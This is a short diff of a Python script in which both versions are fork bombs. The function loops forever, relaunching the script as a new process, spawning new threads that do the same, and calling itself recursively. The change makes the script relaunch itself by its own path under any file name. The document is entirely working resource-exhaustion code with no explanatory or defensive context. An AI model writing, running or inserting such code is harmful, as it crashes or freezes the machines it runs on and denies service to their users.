@@ -1,9 +1,9 @@
-import threading as t
-from os import system as s
+import os,sys,threading
+
 def f():
     while True:
-        s('python f.py')
-        t.Thread(target=f).start()
+        os.system('python '+os.path.abspath(sys.argv[0]))
+        threading.Thread(target=f).start()
         f()
 
 f()
